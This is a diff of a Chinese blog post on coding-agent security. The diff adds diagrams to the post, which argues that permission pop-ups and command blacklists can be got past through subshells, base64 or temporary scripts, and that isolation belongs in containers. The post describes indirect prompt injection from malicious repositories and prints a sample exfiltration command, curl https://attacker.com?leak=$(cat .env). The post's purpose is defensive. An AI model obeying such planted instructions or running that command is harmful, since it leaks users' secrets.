@@ -11,6 +11,11 @@ series: "Agent 的方方面面"
 
 **TL;DR：** 绝大多数编码 Agent 在宣传中强调“内置权限弹窗与命令黑名单”，但在工程上这往往是一种**安全幻觉**——只要执行环境在宿主机，模型就能通过 subshell、base64 编码、管道拼接或写临时脚本轻松绕过正则匹配。Pi 的安全哲学极其清醒：**应用层只负责交互辅助，真正的安全边界必须推给操作系统与虚拟化。** Pi 的核心包不硬编码权限系统，而是通过 05 篇介绍的 `BashOperations` 抽象接口，让用户无缝切换到 Gondolin 微虚拟机、Docker 容器或 OpenShell 隔离运行时；同时依托 `project_trust` 启动门禁与严格的 monorepo 依赖锁定，构筑防御间接提示词注入（Indirect Prompt Injection）与恶意仓库代码执行的完整防线。
 
+
+---
+
+![Agent 权限边界与安全沙箱：为什么 Pi 不做应用层弹窗，而把物理隔离推给 Linux 容器](../../../public/images/pi-agent-security-boundary-container-bubblewrap.svg)
+
 ## 一、应用层权限弹窗的「安全幻觉」
 
 许多开发者初次接触 Agent 时，最直观的安全诉求是：“让 Agent 执行危险命令（如 `rm -rf` 或 `sudo`）前弹窗问我一声”。07 篇展示过，在 Pi 中通过扩展仅需 34 行代码（`examples/extensions/permission-gate.ts`）就能订阅 `tool_call` 事件实现这一交互。
@@ -24,6 +29,10 @@ series: "Agent 的方方面面"
 3. **间接提示词注入（Indirect Prompt Injection）**：恶意仓库在测试用例、Git Commit 或 Markdown 中埋入隐藏指令，诱导模型在分析代码时调用终端执行外发数据的网络请求（如 `curl https://attacker.com?leak=$(cat .env)`）。
 
 如果 Harness 承诺“内置权限系统足以保证安全”，反而会给开发者带来虚假的安全感。因此，Pi 确立了清晰的职责划分：**应用层只管向模型清晰报告工具调用的输入输出，执行环境的物理隔离交给系统级容器。**
+
+
+
+![Agent 引擎三层安全防御纵深：静态命令 AST 过滤 -> Linux Bubblewrap 沙箱 -> 人工授权确认](../../../public/images/agent-security-three-tier-sandbox-isolation.svg)
 
 ## 二、BashOperations 接口：把执行权推向容器
 
@@ -107,6 +116,10 @@ export async function initializeProject(projectDir: string, api: ExtensionAPI) {
 ```
 
 在未获得用户显式信任前，工作区内的局部指令文件（如 `.pi/skills/`）与命令执行工具会被自动禁用，从根源切断了克隆恶意仓库即遭攻陷（Clone-and-RCE）的攻击路径。
+
+
+
+![间接提示词注入 (Indirect Prompt Injection) 攻击与防御链路](../../../public/images/prompt-injection-indirect-data-exfiltration-mitigation.svg)
 
 ## 四、结论：把策略留给用户，把隔离留给系统
 
